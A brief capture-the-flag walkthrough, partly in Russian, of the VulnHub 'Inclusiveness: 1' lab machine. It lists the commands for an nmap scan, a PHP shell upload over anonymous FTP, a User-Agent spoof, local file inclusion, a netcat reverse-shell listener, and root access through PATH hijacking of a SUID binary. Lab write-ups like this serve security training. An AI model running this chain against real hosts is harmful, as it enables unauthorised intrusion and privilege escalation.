https://www.vulnhub.com/entry/inclusiveness-1,422/

enumeration

    nmap -A -sS -v -T4 -p- 192.168.225.151 --min-rate=5000


        Discovered open port 21/tcp on 192.168.225.151
            anon allow
        Discovered open port 22/tcp on 192.168.225.151
            ssh
        Discovered open port 80/tcp on 192.168.225.151
            http

21-port

ftp 192.168.225.151

    ls -al
        pub
    cd pub
    put shell.php

80-port

gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir 192.168.225.151

    ...
    http://192.168.225.151/robots.txt
    ...

curl http://192.168.225.151/robots.txt

    You are not a search engine! You can't read my robots.txt!

перехватим запрос в burp и изменим запрос

    GET /robots.txt HTTP/1.1
    Host: 192.168.225.151
    User-Agent:Googlebot
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1

и вот ответ

    User-agent: \*
    Disallow: /secret_information/

curl http://192.168.225.151/secret_information/

    \<a href='?lang=en.php'>english
    \<a href='?lang=es.php'>spanish

думаю это будущий lfi

rlwrap nc -nlvp 1234  
curl http://192.168.225.151/secret_information/?lang=/var/ftp/pub/shell.php  
<img src=img/inclusive_1_1.jpg width='500'>

22-port_www-data

cd /home/tom  
cat rootshell.c

    FILE* f = popen("whoami", "r");
    ...
    fgets(user, 80, f);
    if (strncmp(user, "tom", 3) == 0) {
    ...
    execlp("sh", "sh", (char *) 0);
    }

думаю здесь для повышения привиллегий можно воспользоваться PATH Variable

echo 'echo tom'>/tmp/whoami  
chmod 777 /tmp/whoami  
export PATH=/tmp:$PATH

4.

./rootshell  
<img src=img/inclusive_1_2.jpg width='500'>

cat /root/flag.txt  
<img src=img/inclusive_1_3.jpg width='200'>
